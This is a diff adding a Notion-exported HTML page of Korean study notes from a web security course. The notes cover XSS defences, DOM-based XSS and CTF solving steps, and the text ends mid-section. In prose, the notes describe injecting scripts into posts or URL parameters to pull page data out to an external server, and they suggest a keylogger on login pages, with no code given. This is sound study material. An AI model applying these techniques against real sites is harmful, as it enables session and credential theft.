@@ -1,0 +1,785 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>xss client side 문제풀이</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="85f483ee-716c-444d-8ea9-54b7cc6418ed" class="page sans"><header><h1 class="page-title" dir="auto">xss client side 문제풀이</h1><p class="page-description" dir="auto"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/list_gray.svg" style="width:14px;height:14px;display:block"/></span>Tags</th><td><span class="selected-value select-value-color-blue">11주차</span><span class="selected-value select-value-color-brown">segfault</span></td></tr></tbody></table></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2d862085-e5ae-80c6-a0c4-f0f6a67f4579" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d862085-e5ae-80c5-81e7-ff19cb97d916">xss 수업내용 정리</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d862085-e5ae-80df-921f-e6a48f0e65eb">11주차 과제 ctf 문제풀이 과정 정리</a></div></nav></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8059-a366-fcab332b0ba5" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="2d862085-e5ae-80c5-81e7-ff19cb97d916" class="">xss 수업내용 정리</h2></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8061-8619-f050ec0fb435" class="">(11주차 <time>@December 24, 2025</time>)</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80bc-90ac-fe32f8cc733f" class="">
+</p></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-800f-a9e3-f1bf30dd33c7" class="bulleted-list"><li style="list-style-type:disc">xss 막는 방법<div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8094-82ef-d1f27d949ce3" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/Screenshot_2025-12-25_at_8.26.16_PM.png"><img style="width:668px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/Screenshot_2025-12-25_at_8.26.16_PM.png"/></a></figure></div><div style="display:contents" dir="auto"><ol type="1" id="2d862085-e5ae-808c-8b32-f7ad300f712b" class="numbered-list" start="1"><li>(일반적인 상황?) 사용자의 입력으로 받는 문자열에서 HTML 특수문자(<code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code> 이런 것들)를 HTML Entity Encoding 형태로 치환하면 됨.<div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8081-a427-d3bbf206b40a" class="toggle"><li><details open=""><summary>HTML Entity Encoding</summary><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8086-9d6d-e8f8c84495de" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image.png"><img style="width:582px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image.png"/></a></figure></div></details></li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2d862085-e5ae-803b-8147-cf1b7f1c05a0" class="numbered-list" start="2"><li>사용자가 직접 HTML 태그를 사용할 수 있는 에디터류 페이지에서는?<div style="display:contents" dir="auto"><ol type="a" id="2d862085-e5ae-80ab-a049-c9b8bcf087ba" class="numbered-list" start="1"><li>1번 처럼 일단 모든 HTML 특수문자를 entity encoding 으로 치환</li></ol></div><div style="display:contents" dir="auto"><ol type="a" id="2d862085-e5ae-80db-82d5-f6d1c1dac154" class="numbered-list" start="2"><li>사용할 수 있도록 허용할 태그만 다시 HTML 특수문자로 바꿔서 html 태그처럼 사용되도록</li></ol></div><div style="display:contents" dir="auto"><ol type="a" id="2d862085-e5ae-809c-9857-d44095451d0e" class="numbered-list" start="3"><li>혹시 허용된 태그 안에 eventHandler 로 악의적인 스크립트가 있을 수 있으니 블랙리스트 기반 치환</li></ol></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8025-bd72-ef613340df9a" class="">⇒ 이런거 gpt 시키면 악의적인 코드 탐지, 적절히 제거해주는 것 잘할듯??</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80a4-a3c8-cd0bb8c71fd6" class="">
+</p></div></li></ol></div></li></ul></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8043-a8b8-c7898cae38d9" class="bulleted-list"><li style="list-style-type:disc">10주차 크사 6번 문제 풀이<div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-80e6-8707-e36f02733bdc" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%201.png"><img style="width:638px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80d6-b56c-f6df08006d05" class="">로그인 페이지 post 요청에서 크사 발생 → 문제는 풀 수 있지만, 세션 탈취해도 로그인 된 상태가 아니라서 실제 상황에서는 쓸모 없을 가능성 높음!<br/>⇒ 이럴 경우, (로그인 데이터 입력하는 페이지에 스크립트를 삽입할 수 있다면) 키로거를 심어서 사용자 입력 id, pw 를 직접 탈취하는 방법도 생각해 볼 수 있음</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8007-ab4a-c3f6a2e14dbe" class="">
+</p></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-80d7-b4ef-dce16399841f" class="bulleted-list"><li style="list-style-type:circle">추가로, 로그인 실패 alert 뜬 뒤 곧바로 로그인 페이지로 이동시키는 방식으로 페이지가 작동해서 내가 삽입한 스크립트가 확실히 실행되는지 안되는지(그리고 완료까지 다 되는지) 까다로운 측면에 대해 설명하면서, <code>navigator.sendBeacon</code> 함수 설명 있었음. 확실하게 요청 보내는것 보장해줌 (브라우저 환경 타긴 한다고 하심) <div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8038-b450-d40ed37beeae" class="toggle"><li><details open=""><summary>Beacon API</summary><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-80aa-8d79-f769e83230cc" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%202.png"><img style="width:2156px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%202.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8092-87c0-e1e5c6905872" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%203.png"><img style="width:2228px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80b2-a786-c621df81ddfc" class="">문제풀었을때 딱히 시간차 관련 문제를 못느꼈던 것 같아서 다시 찾아보니, alert 함수에 들어가는 문자열 인자에서부터 replace 함수를 실행해서 그 다음 스크립트 태그(login.html 로 이동시키는) 실행 전에 fetch 함수가 실행될 수 있었던 것 같음. alert 가 있을 경우 확인버튼 누르기 전에 다음 스크립트 태그가 절대 실행되지 않는 것인지?는 잘 모르겠음</p></div></li></ul></div></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80bb-a8e7-d5de83b401e1" class="">
+</p></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8065-958a-cab3fa9d9ab0" class="bulleted-list"><li style="list-style-type:disc">수업 중 풀어본 크사 챌린지 문제<div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8005-9f3d-cc50b55a3711" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%204.png"><img style="width:667.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8023-92ec-e61e713ad6a2" class="">공격은 리플렉티드 크사와 거의 유사하게 진행될 수 있지만, 서버가 직접 악의적인 스크립트를 넘겨주지는 않음. </p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80a7-b53d-c048b07d0df3" class="">검색어 입력 → url 패러미터로 들어감 → js 가 파싱해서 문서에 추가하게 됨 (<code>document.write</code> 같은 함수 사용)</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8022-9c24-fe0dbec95ef9" class="">이런 유형을 DOM Based XSS 라고 한다고 하심.</p></div></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-805a-8e35-dc51d5f43ee9" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="2d862085-e5ae-80df-921f-e6a48f0e65eb" class="">11주차 과제 ctf 문제풀이 과정 정리</h2></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-80cb-a0c5-d574df9a9018" class="bulleted-list"><li style="list-style-type:disc">클라이언트 스크립트 베이직 문제<div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-804f-8ff2-e35d9e6c8b38" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%205.png"><img style="width:2582px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80fc-b273-f73da44853cf" class="">마이페이지의 url 패러미터에 user 값을 변경하면 페이지에 반영됨 → 스크립트 삽입 가능</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80ba-a459-c1ef40cf3010" class="">⇒ 자바스크립트로<code> document.getElementBy~~</code> 류 함수 사용해서 필요한 정보 추출할 수 있음(내 서버로 보내기 or 나중에 데이터 확인할 수 있는 곳으로 빼돌리기)</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8072-9658-d720249df78e" class="">
+</p></div></li></ul></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8094-ae1a-ead3a6a731d4" class="bulleted-list"><li style="list-style-type:disc">클라이언트 스크립트 스틸인포1 문제<div style="display:contents" dir="auto"><p id="2d862085-e5ae-80dc-9fe4-c7fca43bf0cc" class="">스틸인포 문제들은 모두 게시판 게시글에 스크립트 삽입이 가능한 상황.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-805e-b9e9-cc81956ab056" class="">관리자가 방문할 실제 <code>타겟페이지</code>와 그 페이지랑 동일하게 생긴 <code>예시페이지</code> 주소가 제시됨.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80a0-8bbc-e272ba92da13" class="">예시페이지 구조 파악 후 게시글에 스크립트로 예시페이지에서 원하는 정보가 있는 태그의 텍스트 값을 추출 및 외부서버로 전송하는 스크립트 만들어보면서 테스트</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8093-be5d-dcda56145b88" class="">⇒ 예시페이지 주소를 타겟페이지로 변경한 뒤 해당 게시글 링크를 관리자 봇이 방문하도록 하면 됨</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80b7-aadf-fa4b8ac177b5" class="">
